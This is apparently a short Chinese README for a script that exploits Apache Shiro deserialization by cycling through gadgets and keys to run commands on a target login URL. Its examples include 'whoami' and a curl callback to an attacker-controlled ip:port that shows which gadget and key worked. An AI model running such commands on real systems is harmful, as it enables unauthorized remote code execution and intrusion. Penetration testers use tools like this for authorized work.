## Apache Shiro

#### 使用方法

```bash
python3 Apache_Shiro_Scan.py -u http://target.com/user/login.do -c 'whoami'
```

`-u` 指定目标 url

`-c` 指定命令

`-g` 指定 Gadget，如不指定，遍历脚本中的 11 个 Gadget

`-k` 指定 Key，如不指定，遍历脚本中的所有 Key

`-f` 指定一个字符串，如果指定且该字符串出现在 `-c` 指定的命令中，则会替换这个字符串为每次遍历时的 Gadget 和 Key


`-f` 参数可以识别命令执行时使用的是哪个 Gadget 和哪个 Key，在需要判断是哪个 Gadget 和哪个 Key 时使用


示例：

```bash
python3 Apache_Shiro_Scan.py -u http://target.com/user/login.do -c 'curl http://ip:port/GGKK' -f GGKK
```

`-c` 指定的 `curl http://ip:port/GGKK` 中的 GGKK 会被替换每次遍历 Gadget 和 Key 的值，如：curl http://ip:port/CommonsCollections10kPH+bIxk5D2deZiIxcaaaA==


#### 参考

[ShiroScan](https://github.com/sv3nbeast/ShiroScan)

[java.lang.Runtime.exec() Payload Workarounds](http://www.jackson-t.ca/runtime-exec-payloads.html)
